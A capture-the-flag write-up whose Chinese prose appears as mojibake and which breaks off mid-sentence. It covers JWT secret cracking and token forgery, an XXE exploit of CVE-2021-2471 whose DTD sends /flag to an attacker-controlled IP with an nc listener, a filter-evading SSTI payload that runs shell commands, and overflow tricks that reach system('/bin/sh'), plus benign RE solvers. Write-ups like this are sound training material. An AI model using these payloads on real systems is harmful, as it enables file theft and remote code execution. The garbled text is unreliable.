åªæœ‰vvèƒ½æŠ½åˆ°flagï¼Œé‚£ä¹ˆå°±è¦æƒ³åŠæ³•è®©æœåŠ¡å™¨è®¤ä¸ºæˆ‘æ˜¯vvå’¯ï¼Œæƒ³æƒ³æœåŠ¡å™¨æ˜¯å¦‚ä½•è·å–æˆ‘ä»¬èº«ä»½çš„ï¼Œä¸€èˆ¬ä¼šçœ‹çœ‹æˆ‘ä»¬çš„cookie

```
cookie:

jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3Vlc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU
```

æç¤ºçš„å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸²jwtï¼Œé‚£ä¹ˆæœæœjwtæ˜¯ä»€ä¹ˆï¼Œæœå®Œä½ å°±èƒ½å‘ç°ï¼Œç°åœ¨æˆ‘æ˜¯guestï¼Œå¦‚æœroleå˜æˆvvé‚£åº”è¯¥æ˜¯èƒ½æŠ½å‡ºæ¥äº†ï¼Œä½†æ˜¯jwtæœ€åä¸€ä¸²ç­¾åè®©æˆ‘ä»¬ä¸å¥½æ›´æ”¹å‰é¢çš„å†…å®¹ï¼Œå¦‚æœåªæ”¹äº†å‰é¢ä¸æ”¹åé¢ï¼ŒæœåŠ¡å™¨å‘ç°ç­¾åè§£å¯†åä¸å‰é¢çš„ä¸ç¬¦åˆå°±ä¼šæŠ›å‡ºé”™è¯¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦çˆ†ç ´å¯†é’¥æ¥æ›´æ”¹åé¢çš„ç­¾åï¼Œåˆ©ç”¨jwt_toolsçˆ†ç ´å°±è¡Œ

```shell
weiwei@vv-laptop /m/d/C/W/jwt_tool (master) [1]> python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZ3V
lc3QifQ.f6LlphhWFq9tWAIIapPp5992MPDPoybDUYV4HRcpWsU -C -d password.txt

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

[+] secret is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret"
```

```python
import jwt
# å®šä¹‰å¤´éƒ¨ï¼ˆHeaderï¼‰
header = {
    "alg": "HS256",
    "typ": "JWT"
}
# å®šä¹‰è´Ÿè½½ï¼ˆPayloadï¼‰
payload = {
    "role": "vv"
}
# å¯†é’¥ï¼ˆKeyï¼‰
secret_key = "secret"
token = jwt.encode(payload, secret_key, algorithm="HS256", headers=header)
print(token)
#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidnYifQ.JNGUsBcqTN5sBHETncoddUCd2ZdiQkyLF8qJ_yUYRNE
```

æ”¹ä¸€ä¸‹cookieï¼Œå†æŠ½ä¸€å‘å°±èƒ½æŠ½å‡ºå•¦

### Ezjava

ä¸»é¡µæç¤ºè·¯ç”± `/vuln` ï¼Œè®¿é—®åæœ‰æœ¬é¢˜çš„æç¤ºï¼š

```
ä¸ºä»€ä¹ˆæ˜¯Java?JaråŒ…èƒ½å¹²å˜›?JDBCä¾èµ–æ˜¯ä»€ä¹ˆ?CVEæ˜¯ä»€ä¹ˆ?XXEæ˜¯ä»€ä¹ˆ?æ€ä¹ˆè¯»å–åˆ°Flag?SQLæ˜¯ä»€ä¹ˆ?ä¸Šå“ªå»æ­æ¶æ„æœåŠ¡?è¯»äº†Flagå´çœ‹ä¸åˆ°?é‚£å’‹åŠå‘¢o.O?
```

ä¸‹è½½çš„jaråŒ…å¯ä»¥ç”¨ [jadx-gui](https://github.com/skylot/jadx) åç¼–è¯‘ï¼Œæ‹¿åˆ°æºä»£ç åå…³æ³¨ `org.example.ezjava` è¿™ä¸ªåŒ…çš„å†…å®¹ï¼Œé‡Œé¢å°±æ˜¯æœ¬ä½“çš„æºç ï¼Œåœ¨"MainController"ä¸­èƒ½çœ‹åˆ°POSTè®¿é—® `/vuln` è·¯ç”±æ—¶ï¼Œç”¨æˆ·å¯ä»¥ä¼ å…¥è‡ªå®šä¹‰çš„ jdbc è¿æ¥ä¸²ï¼Œé€šè¿‡è¯¥è¿æ¥ä¸² jdbc å°†ä¼šè®¿é—®æŒ‡å®šçš„è¿œç¨‹æ•°æ®åº“ï¼Œä»åº“ä¸­çš„ `exp` è¡¨ä¸­è®¿é—®è®°å½•çš„ `content` å†…å®¹ï¼Œå¹¶å°†å…¶ä½œä¸ºXMLè§£æã€‚

```java
 @PostMapping({"/vuln"})
    public String vuln(@RequestParam(value = "jdbc_conn", defaultValue = "") String jdbc_conn) throws SQLException, ClassNotFoundException {
        Class.forName("com.mysql.cj.jdbc.Driver");
        Connection connection = DriverManager.getConnection(jdbc_conn);
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from exp");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("content");
                sqlxml.getSource(DOMSource.class);
            }
            return "O.oä½ æ‹¿åˆ°flagäº†å—?";
        }
        return "O.oä½ æ‹¿åˆ°flagäº†å—?";
    }
```

ç»“åˆæç¤ºä¸æœç´¢å¼•æ“èƒ½å¤Ÿæ‰¾åˆ°è¿™æ˜¯ä¸ªå…¬å¼€æ¼æ´ï¼šCVE-2021-2471ã€‚æ¼æ´ç»†èŠ‚å¤§å®¶è‡ªå·±æœç´¢æŠ€æœ¯åšå®¢å­¦ä¹ ï¼Œç®€å•æ¥è¯´å°±æ˜¯ `SQLXML` è¿™ä¸ªç±»çš„ `getSource` æ–¹æ³•å…è®¸XXEæ”»å‡»ã€‚æç¤ºä¸­ç»™å‡ºflagçš„ä½ç½®åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ç”¨XXEè¯»å– `/flag` æ–‡ä»¶å¹¶å°†å…¶å¤–å¸¦ã€‚æˆ‘ä»¬éœ€è¦åœ¨å…¬ç½‘ï¼ˆæœåŠ¡å™¨æˆ–è€…å†…ç½‘ç©¿é€ï¼‰æ­å»ºä¸€ä¸ªMysqlæœåŠ¡ï¼Œä»»æ„åˆ›å»ºä¸€ä¸ªåº“ï¼Œæ·»åŠ ä¸€å¼ åä¸º `exp` è¡¨æ ¼ï¼Œä¿è¯å…¶æœ‰ `content` å­—æ®µï¼Œå¹¶å†™å…¥ä¸€æ¡è®°å½•ï¼Œå…¶ `content` å­—æ®µçš„å†…å®¹æ˜¯ XXE çš„æ”»å‡» payload å³å¯ã€‚å…³äº XXE çš„æ”»å‡»ç»†èŠ‚è‡ªè¡Œå­¦ä¹ ï¼Œä¸‹é¢æä¾›å‚è€ƒçš„æ”»å‡»æµç¨‹ä¸payloadã€‚

---

å‡è®¾å…¬ç½‘æœ‰ä¸€å°ç”¨äºæ”»å‡»çš„æœåŠ¡å™¨ï¼Œå…¶IPæ˜¯ `233.233.233.233`ï¼š

1. ä½¿ç”¨ `23333` ç«¯å£ç›‘å¬å¤–å¸¦çš„flagï¼š

	```bash
	nc -lvnp 23333 
	```

2. æ­å»ºé™æ€ç½‘é¡µæœåŠ¡ï¼ŒæœåŠ¡èµ·åœ¨ 80 ç«¯å£ï¼Œæ”¾ç½®ä¸€ä¸ªæ¶æ„dtdæ–‡ä»¶ï¼Œå…¶è·¯å¾„ä¸ºé™æ€ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ï¼š`XXE/evil.dtd` ï¼Œå†…å®¹ï¼š

	```dtd
	<!ENTITY % secret SYSTEM "file:///flag">
	<!ENTITY % evil_dtd "<!ENTITY &#37; exp SYSTEM 'http://233.233.233.233:23333/?res=%secret;'>">
	%evil_dtd;
	%exp;
	```

3. MysqlæœåŠ¡æ­å»ºåœ¨ 3306 ç«¯å£ï¼Œè´¦æˆ·å¯†ç ä¸º `root:root`ï¼Œåˆ›å»ºä¸€ä¸ªåä¸º `Test` çš„æ•°æ®åº“ï¼Œåˆ›å»ºä¸€å¼  `exp` è¡¨ï¼š

	```mysql
	CREATE TABLE `exp` (
	  `id` int NOT NULL AUTO_INCREMENT,
	  `content` text,
	  PRIMARY KEY (`id`)
	) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
	```

	æ’å…¥ä¸€æ¡è®°å½•ï¼š

	```mysql
	insert into `exp`(content) values('<?xml version="1.0" encoding="utf-8"?><!DOCTYPE remote SYSTEM "http://233.233.233.233:80/XXE/evil.dtd">');
	```

4. ç¡®ä¿ä¸Šè¿°æœåŠ¡éƒ½æ­å»ºå®Œæ¯•ï¼Œä¸”éƒ½å¯ä»¥è¢«æ­£ç¡®çš„è®¿é—®ï¼ˆä¸è¡Œçš„è¯æ£€æŸ¥æœåŠ¡çŠ¶æ€å’Œé˜²ç«å¢™ï¼‰ï¼Œç„¶åPOSTè®¿é—® `/vuln` è·¯ç”±ï¼Œéœ€è¦ä¼ å…¥çš„jdbcè¿æ¥ä¸²å¦‚ä¸‹ï¼š

	```mysql
	jdbc:mysql://233.233.233.233:3306/Test?user=root&password=root
	```

	ä¼ å‚æ—¶éœ€è¦URLç¼–ç ï¼Œæœ€åä¼ å…¥çš„å‚æ•°é•¿è¿™æ ·ï¼š

	```php
	jdbc_conn=jdbc%3Amysql%3A%2F%2F233%2E233%2E233%2E233%3A3306%2FTest%3Fuser%3Droot%26password%3Droot
	```

	å¦‚æœä½ çš„æ“ä½œæ­£ç¡®ï¼Œä½ èƒ½åœ¨ç›‘å¬å¤–å¸¦ä¿¡æ¯çš„ç«¯å£çœ‹åˆ°ç±»ä¼¼å¦‚ä¸‹çš„è¯·æ±‚åŒ…ï¼š

	```bash
	Listening on 0.0.0.0 23333
	Connection received on 124.222.157.100 52522
	GET /?res=r00t2024{5a124970-b219-4818-8460-76a5ce491df7} HTTP/1.1
	User-Agent: Java/17-ea
	Host: 233.233.233.233:23333
	Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
	Connection: keep-alive
	```


### ç¥ç§˜çš„æ°´æ™¶çƒ

ç»å…¸çš„sstiï¼Œè¾“å…¥{{7*7}}ï¼Œå‘ç°å›æ˜¾æ˜¯49ï¼Œå¯çŸ¥è¿™é‡Œæœ‰sstiæ³¨å…¥ï¼Œé‚£ä¹ˆåœ¨å°è¯•çš„è¿‡ç¨‹ä¸­ä¼šå‘ç°banæ‰äº†ä¸€äº›å­—ç¬¦ï¼Œæ¯”å¦‚`class`ã€`flag`ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ç»•è¿‡ï¼Œæ­¤å¤„æˆ‘é‡‡å–çš„æ–¹å¼æ˜¯å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼Œæ³¨æ„å½“ä½ é‡‡å–å­—ç¬¦ä¸²æ‹¼æ¥çš„æ—¶å€™å°±éœ€è¦ç”¨ä¸­æ‹¬å·æ¥è®¿é—®ï¼Œè€Œä¸æ˜¯`.`

æœ€ç»ˆpayload:

`{{''['__cla'+'ss__'].__base__['__subcla'+'sses__']()[132].__init__.__globals__["po"+"pen"]("cat"+" fla"+"g.txt").read()}}`

## re

### å¤ä»‡ï¼Ÿï¼

å¯ä»¥å‘ç°sub_41116Då’Œsub_411118ä¸¤ä¸ªå‡½æ•°æ— æ³•è¯†åˆ«

![image-20241113090313304](assests/1.png)

æŸ¥çœ‹æ±‡ç¼–ä¼šå‘ç°æ˜¯åŠ äº†èŠ±æŒ‡ä»¤

![image-20241113090703662](assests/2.png)

ç¬¬ä¸€ä¸ªèŠ±æ˜¯jzå’Œjnzçš„äº’è¡¥è·³è½¬ï¼Œå°†E8 nopæ‰å³å¯

åœ¨å‡½æ•°èµ·å§‹ä½ç½®æŒ‰pé‡æ–°ç¼–æˆå‡½æ•°

![image-20241113090843399](assests/3.png)

ç¬¬äºŒä¸ªèŠ±æ˜¯æ˜¯ä¸€ä¸ªæ°¸çœŸè·³è½¬

![image-20241113090953836](assests/4.png)

åŒæ ·å°†E9çš„jmp nopæ‰å³å¯

![image-20241113091045617](assests/5.png)

å¯ä»¥æ ¹æ®ä¸¤ä¸ªå‡½æ•°å‘ç°è¿˜æ˜¯RC4åŠ å¯†ï¼Œä½†æ˜¯åšäº†é­”æ”¹ï¼Œåœ¨åŠ å¯†å‡½æ•°çš„æœ€åä¸€æ­¥å¼‚æˆ–äº†0x24ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨å·¥å…·äº†ï¼Œéœ€è¦è‡ªå·±å†™è„šæœ¬è§£å¯†

expå¦‚ä¸‹

```c++
#include <stdio.h>
#include <string.h>
#include<stdlib.h>
#include<stdint.h>

void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len)
{
    int i = 0, j = 0;
    char k[256] = { 0 };
    unsigned char tmp = 0;

    for (i = 0; i < 256; i++)
    {
        s[i] = i;
        k[i] = key[i % Len];
    }
    for (i = 0; i < 256; i++)
    {
        j = (j + s[i] + k[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }
}

void rc4_crypt(unsigned char* s, unsigned char* Data, unsigned long Len)
{
         

    int i = 0, j = 0, t = 0;
    unsigned long k = 0;
    unsigned char tmp;
    
    for (k = 0; k < Len; k++)
    {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        t = (s[i] + s[j]) % 256;
        Data[k] =Data[k] ^ s[t] ^ 0x24 ;
    }
}

int main()
{
    unsigned char s[256] = { 0 }, s2[256] = { 0 };
    char key[] =  "2024r00t" ;
    unsigned char flag[] = {0x76, 0xEF, 0x08, 0x29, 0xD0, 0x75, 0x1C, 0x95, 0xA2, 0x1D, 
  0xC2, 0xAC, 0xDD, 0x41, 0xEB, 0x5E, 0x58, 0xE0, 0x43, 0xBE, 
  0x9D, 0xB3, 0x63, 0xE9, 0x95, 0x88, 0x47};
    int i = 0;
    int len =27;
    
    rc4_init(s, (unsigned char*)key, strlen(key));
    rc4_crypt(s, flag, len);
    
    for(int i=0;i<len;i++){
        printf("%c", flag[i]);
    }

    return 0;
}
```

### çªƒå¬é£äº‘

é™„ä»¶æ˜¯ä¸€ä¸ªwhlæ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡pipå®‰è£…åˆ°è‡ªå·±çš„pythonä¸Šï¼Œå¯ä»¥é€šè¿‡helpå‘½ä»¤äº†è§£è¯¦ç»†å†…å®¹

![image-20241115220526965](assests/6.png)

æ ¹æ®å…¶ä¸­çš„æ–¹æ³•ä¸æç¤ºï¼Œå†™å‡ºå¦‚ä¸‹è„šæœ¬è·å–boxä¸­çš„ä¿¡æ¯

```python
import qtfy
help(qtfy)

b = qtfy.box()
e = qtfy.eavesdropping_device()
for t in range(10000):
    e.eavesdrop(b,t)
```

ç»“æœå¦‚ä¸‹

YSAqIC0zMiArIGIgKiA5MCArIGMgKiA5OCArIGQgKiAyMyArIGUgKiA1NSA9PSAzMzMzMjIKYSAqIC0zMjIgKyBiICogMzIgKyBjICogNjggKyBkICogMTIzICsgZSAqIDY3ID09IDcwNzcyNAphICogLTM0ICsgYiAqIDMyICsgYyAqIDQzICsgZCAqIDI2NiArIGUgKiA4ID09IDEyNzI1MjkKYSAqIC0zNTIgKyBiICogNSArIGMgKiA1OCArIGQgKiAzNDMgKyBlICogNjUgPT0gMTY3MjQ1NwphICogLTMyMSArIGIgKiA5NzAgKyBjICogOTM4ICsgZCAqIDIzMSArIGUgKiA1NTUgPT0gMzM3MjM2Nw==

å¯ä»¥çŸ¥é“æ˜¯base64ç¼–ç ï¼Œè§£ç ï¼š

![image-20241115220735189](assests/7.png)

åˆ©ç”¨z3ç®—å‡ºabcdeçš„å€¼

```python
from z3 import *

a,b,c,d,e = Ints('a b c d e')
solver = Solver()
solver.add(a * -32 + b * 90 + c * 98 + d * 23 + e * 55 == 333322)
solver.add(a * -322 + b * 32 + c * 68 + d * 123 + e * 67 == 707724)
solver.add(a * -34 + b * 32 + c * 43 + d * 266 + e * 8 == 1272529)
solver.add(a * -352 + b * 5 + c * 58 + d * 343 + e * 65 == 1672457)
solver.add(a * -321 + b * 970 + c * 938 + d * 231 + e * 555 == 3372367)

solver.check()
print(solver.model())
```

[d = 4544, e = 1754, a = 123, b = 777, c = 677]

flagï¼šr00t2024{123_777_677_4544_1754}

### å›¢ç»“ä¸€å¿ƒçš„r00t

è¿™é“é¢˜éš¾åº¦è¾ƒå¤§ï¼Œç”±flag1å’Œflag2ç»„æˆã€‚Flag1åœ¨idaä¸­ç‚¹å‡»encrypt_flag1æœ‰å¤šå¤„æŒ‡å‘æ€§æš—ç¤ºï¼Œä¾‹å¦‚ç¼“å†²åŒºæ•°ç»„çš„char[256]ï¼Œconsté‡Œçš„å­—ç¬¦ä¸²ï¼Œå‡½æ•°ä¸­çš„ä¸‰ä¸ªå­—ç¬¦ä¸€ç»„çš„åˆ’åˆ†éƒ½æ˜¯æŒ‡å‘äº†base64åŠ å¯†ï¼Œä¸éš¾çœ‹å‡ºä¸ç®¡è¾“å…¥ä»€ä¹ˆæœ€ç»ˆéƒ½ä¼šè¢«èµ‹å€¼ä¸ºdV9hcjNfdGgzXw==ï¼Œåœ¨çº¿æˆ–è€…ç¼–ç¨‹è§£ç åæ˜¯u_ar3_th3_å³ç¬¬ä¸€æ®µã€‚ç¬¬äºŒæ®µåŠ å¯†åŸç†ä¸ºæ¯ä¸ªå­—ç¬¦asciiç å€¼-3å†åè½¬ï¼Œå†™è„šæœ¬è§£ç å³å¯ã€‚

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define _CRT_SECURE_NO_WARNINGS  // ç¦ç”¨å®‰å…¨è­¦å‘Š

// flag2 è§£å¯†å‡½æ•°ï¼šåè½¬å­—ç¬¦ä¸²ï¼Œç„¶åæ¯ä¸ªå­—ç¬¦ ASCII å€¼åŠ ä¸Š 3
char* decrypt_flag2(const char* input) {
    size_t length = strlen(input);
    char* result = (char*)malloc(length + 1);
    if (result == NULL) return NULL;

    // åè½¬åŠ å¯†çš„å­—ç¬¦ä¸²
    printf("Reversing the string: ");
    for (size_t i = 0; i < length; i++) {
        result[i] = input[length - i - 1];  // æ­£ç¡®åè½¬
    }

    // æ‰“å°åè½¬åçš„å­—ç¬¦ä¸²
    printf("Reversed string: %s\n", result);

    // å¯¹æ¯ä¸ªå­—ç¬¦çš„ ASCII å€¼åŠ ä¸Š 3ï¼ˆç¡®ä¿ä¸ä¼šè¶…å‡ºå¯æ‰“å°å­—ç¬¦èŒƒå›´ï¼‰
    for (size_t i = 0; i < length; i++) {
        result[i] = result[i] + 3;  // æ¢å¤å­—ç¬¦
        // ç¡®ä¿æ¢å¤åçš„å­—ç¬¦åœ¨æœ‰æ•ˆçš„ ASCII èŒƒå›´å†…
        if (result[i] < 32 || result[i] > 126) {
            printf("Warning: Character out of printable ASCII range! ('%c' -> '%c')\n", result[i] - 3, result[i]);
        }
        printf("Character '%c' -> '%c'\n", result[i] - 3, result[i]);  // æ‰“å°å­—ç¬¦è½¬æ¢è¿‡ç¨‹
    }

    result[length] = '\0';  // å­—ç¬¦ä¸²ç»“æŸç¬¦
    return result;
}

int main() {
    // è¾“å…¥åŠ å¯†åçš„å­—ç¬¦ä¸²
    char input[256];
    printf("Please enter the encrypted flag2 string: ");
    fgets(input, sizeof(input), stdin);

    // ç§»é™¤è¾“å…¥å­—ç¬¦ä¸²çš„æ¢è¡Œç¬¦
    input[strcspn(input, "\n")] = 0;

    // è§£å¯† flag2
    char* decrypted_flag2 = decrypt_flag2(input);
    if (decrypted_flag2 != NULL) {
        printf("Decrypted flag2: %s\n", decrypted_flag2);  // è¾“å‡ºè§£å¯†åçš„å­—ç¬¦ä¸²
    }
    else {
        printf("Memory allocation failed for decryption.\n");
    }

    // é‡Šæ”¾å†…å­˜
    free(decrypted_flag2);

    return 0;
}
```

### destination

æœ¬é¢˜æ˜¯ä¸€é“upxæ”¹å£³é¢˜ï¼Œç”¨010editoræŸ¥çœ‹ä¸‰å¤„æ ‡è®°ä½upx0,upx1,upx!ï¼Œå®¹æ˜“å‘ç°è¢«æ›´æ”¹äº†55å­—èŠ‚ï¼Œè¡¥ä¸Šåä¾¿å¯ä»¥è½»æ¾è„±å£³ï¼Œåœ¨idaå‘ç°æ˜¯å†’æ³¡æ’åºï¼Œä¹‹åä¾¿è½»æ˜“å¯¹åŸå§‹å­—ç¬¦ä¸²è¿›è¡Œæ’åºå¾—åˆ°flagã€‚

## pwn

### ä¿„ç½—æ–¯æ–¹å—

1.checksecæŸ¥çœ‹æ–‡ä»¶åŸºæœ¬ä¿¡æ¯ï¼Œå‘ç°æ˜¯64ä½ç¨‹åº

![image-20241106154453636](assests/21.png)

2.æ‹¿åˆ°å¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨IDAé‡Œçœ‹ä¸€ä¸‹æºç ï¼Œ64ä½ç¨‹åºç”¨64ä½IDAæ‰“å¼€,ä¸€è¿›ä¸»å‡½æ•°å°±å‘ç°äº†system("bin/sh")

![image-20241106155249914](assests/22.png)

çœ‹çœ‹é¢˜ç›®çš„æè¿°å’Œæç¤ºï¼šè®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæ¸¸æˆéœ€è¦çš„è¾¹ç•Œé«˜åº¦

![image-20241106154716367](assests/23.png)

ç»è¿‡æµ‹è¯•è¿˜æœ‰æºç åˆ†æ

![image-20241106154905375](assests/25.png)

è¾“å…¥å¤§äº5çš„æ•°æˆ–è€…å¤§äº0å°äº3çš„æ•°éƒ½æ˜¯ä¸è¢«å…è®¸çš„

ç›®å‰çœ‹æ¥åªèƒ½è¾“å…¥4æˆ–è€…5ï¼Œä½†æ˜¯è¿è¡Œèµ·æ¥å‘ç°ï¼Œ4æˆ–5çš„è¾¹ç•Œæ ¹æœ¬ä¸è¶³ä»¥å®Œæˆæ¶ˆé™¤ä¸€è¡Œçš„ç›®æ ‡ï¼ŒçœŸçš„æœ‰äººæ‹¼æ‰‹é€Ÿèƒ½è¾¾åˆ°å—hhï¼Œå¦‚æœæœ‰ç§ä¿¡æˆ‘è¯·ä½ å–å¥¶èŒ¶å“ˆå“ˆè¾›è‹¦äº†ğŸ˜€

å†çœ‹é¢˜ç›®è¿˜æœ‰ä¸€ä¸ªæç¤ºï¼Œæ•´æ•°æº¢å‡ºï¼Œåœ¨è¿™é‡Œæ£€éªŒçš„æ—¶å€™ï¼Œæ˜¯è¯´heightä¸èƒ½å¤§äº5ï¼Œä¹Ÿä¸èƒ½å°äº3ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿï¼Œåˆ¤æ–­æ˜¯å¦å°äºä¸‰çš„æ—¶å€™ç”¨çš„æ˜¯unsigned intï¼Œå»å­¦ä¹ äº†æ•´æ•°æº¢å‡ºçš„ç›¸å…³çŸ¥è¯†å°±ä¼šçŸ¥é“ï¼Œintç±»å‹çš„è´Ÿæ•°è½¬æ¢æˆunsigned intæ—¶ï¼Œä¼šå˜æˆå¾ˆå¤§çš„æ­£æ•°ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬è¾“å…¥éšä¾¿ä¸€ä¸ªè´Ÿæ•°å°±å®Œæˆäº†ç»•è¿‡

![image-20241106155335441](assests/26.png)

![image-20241106155737464](assests/27.png)

è¿™ä¸ªæ—¶å€™æ¸¸æˆå°±å¼€å§‹äº†ï¼Œä»–ç»™äº†æˆ‘ä»¬è¶³å¤Ÿå¤§çš„è¾¹ç•Œï¼Œæ¶ˆé™¤ä¸€è¡Œå°±å¾ˆç®€å•äº†

![image-20241106160218161](assests/28.png)

æ¶ˆé™¤ä¸€è¡Œåï¼Œä¼šå¼¹å‡ºshellï¼Œlsï¼Œcat flagï¼Œå®Œæˆ

![image-20241106160150442](assests/29.png)

### ezstack

1.æ‹¿åˆ°ç¨‹åºchecksecæŸ¥çœ‹ç¨‹åºæ²¡æœ‰canaryæ£€æµ‹ï¼Œä¹Ÿæ²¡æœ‰pieåç§»ï¼Œæ˜¯32ä½ç¨‹åº

![img](assests/clip_image002.png)

2.è¿è¡Œä¸€ä¸‹ï¼Œç¨‹åºæ¥å—ä¸€ä¸ªè¾“å…¥ï¼Œå†å°†æˆ‘ä»¬çš„è¾“å…¥å›æ˜¾

![img](assests/clip_image004.png)

3.å°†äºŒè¿›åˆ¶æ–‡ä»¶æ”¾å…¥IDA

![img](assests/clip_image006.png)

æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹æ˜¯fgetsï¼Œfgetså‡½æ•°å…è®¸æˆ‘ä»¬è¾“å…¥æœ€å¤š31ä¸ªå­—ç¬¦ï¼Œè€Œsæ•°ç»„çš„å¤§å°æ˜¯64ï¼Œè¦æƒ³åœ¨è¿™æº¢å‡ºæ˜¯ä¸å¯èƒ½çš„ï¼Œæ¥ç€å‘ä¸‹åˆ†æ

![å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº  æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ](assests/clip_image008.png)

replaceå‡½æ•°å¼•èµ·äº†æˆ‘ä»¬çš„æ³¨æ„ï¼Œåœ¨ç‚¹è¿›replaceå‡½æ•°ä¹‹å‰æˆ‘ä»¬å°±åº”è¯¥æƒ³åˆ°ï¼Œå®ƒçš„ä½œç”¨å°±æ˜¯æ›¿æ¢å­—ç¬¦ä¸²ï¼Œç‚¹è¿›å»å‘ç°å®ƒçš„é€»è¾‘ä¸»è¦åœ¨è¿™å‡ ä¸ªåœ°æ–¹ï¼Œå…¶ä¸­så’Œs2ï¼Œnæ˜¯æˆ‘ä»¬ä¼ å…¥å‡½æ•°çš„å‚æ•°ï¼Œså³ä¸ºç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œâ€œrâ€,å¯¹åº”çš„å½¢å‚æ˜¯s2ï¼Œâ€™rootâ€™å¯¹åº”å½¢å‚src

![æ‰‹æœºå±å¹•çš„æˆªå›¾  æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ](assests/clip_image010.png)

![img](assests/clip_image012.png)
 ![æ–‡æœ¬  æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ](assests/clip_image014.png)

é€šè¿‡å¯¹ç¨‹åºåˆ†æï¼Œå‘ç°ä»–å°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„rç»Ÿç»Ÿæ›¿æ¢æˆrootå››ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥å°½ç®¡æˆ‘ä»¬åªèƒ½è¾“å…¥31ä¸ªå­—ç¬¦ï¼Œä½†å¦‚æœæˆ‘ä»¬è¾“å…¥31â€™râ€™ï¼Œå°±ä¼šè¢«æ›¿æ¢ä¸º31ä¸ªâ€˜rootâ€™

31*4ä¹Ÿå°±æ˜¯124

å›åˆ°mainå‡½æ•°ç»§ç»­åˆ†æï¼Œè¢«æ›¿æ¢åçš„så­—ç¬¦ä¸²èµ‹ç»™äº†destï¼Œè€Œdestè¿™ä¸ªæ•°ç»„é•¿åº¦åªæœ‰32ï¼Œä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬æœ‰äº†æº¢å‡ºçš„å¯èƒ½

![img](assests/clip_image016.jpg)

4.æ¥ä¸‹æ¥å°±çœ‹çœ‹æº¢å‡ºå¤šå°‘ä¸ªå­—èŠ‚ï¼Œæœ‰æ²¡æœ‰system(â€œ/bin/shâ€)å‡½æ•°ï¼Œæœ‰systemåˆ™ç›´æ¥è·³åˆ°systemå‡½æ•°æ‰§è¡Œ

![img](assests/clip_image018.png)

å¯ä»¥çœ‹å‡ºæº¢å‡ºå­—èŠ‚æ˜¯0x24+4

5.ç¨‹åºä¸­ä¹Ÿå­˜åœ¨å¯ä»¥ç›´æ¥åˆ©ç”¨çš„systemå‡½æ•°

![å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬  æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ](assests/clip_image022.png)

![img](assests/clip_image024.png)

è°ƒç”¨system(â€œ/bin/shâ€)çš„functionå‡½æ•°åœ°å€ä¸º0x804931C

6.æ”»å‡»è„šæœ¬å¦‚ä¸‹

æœ¬åœ°æ‰“é€šåæ³¨é‡Šæ‰processï¼Œå¯ç”¨remoteè¿æ¥

![img](assests/clip_image026.png)

 

## misc

### ez_jail

å®é™…ä¸Šå°±æ˜¯banäº†å¾ˆå¤šä¸œè¥¿ä¹‹åï¼Œè®©ä½ base64åŠ å¯†ä¸€ä¸‹ä½ è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ‰§è¡Œä¹‹åè®©s=boxï¼Œè€Œboxè¢«banäº†ï¼Œé‚£ä¹ˆå…¶å®å¯ä»¥ç”¨å…¨è§’å­—ç¬¦ç»•è¿‡ï¼š`cz3vvKLvvK/vvLgK`ï¼Œä¹Ÿå°±æ˜¯ s=ï¼¢ï¼¯ï¼¸ çš„base64

å½“ç„¶ç”±äºboxæ˜¯sç›’çš„å†…å®¹ï¼Œå…¶å®ä¹Ÿå¯ä»¥æ„é€ sç›’ï¼š

